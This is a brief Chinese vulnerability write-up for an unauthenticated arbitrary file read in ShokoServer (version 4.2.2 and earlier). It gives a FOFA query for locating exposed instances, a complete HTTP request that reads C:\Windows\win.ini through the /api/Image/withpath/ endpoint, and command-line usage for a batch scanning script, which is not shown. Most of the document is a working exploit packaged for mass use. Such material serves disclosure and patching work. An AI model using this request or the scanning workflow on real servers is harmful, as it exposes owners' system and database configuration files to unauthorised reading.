# ShokoServer任意文件读取漏洞

### 1.漏洞描述

ShokoServer /apilmageithpath/接口处存在任意文件读取漏洞，未经身份验证得攻击者可通过该漏洞读取系统重要文件(如数据库配置文件、系统配置文件)、数据库配置文件等等，导致网站处于极度不安全状态。

### 2.影响范围

version <= 4.2.2

### 3.fofa语法

```plain
title="Shoko WEB UI"
```

### 4.漏洞复现

```plain
GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719838883348-77178704-3f92-497d-84cb-62d95061e3cc.png)

### 5.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```
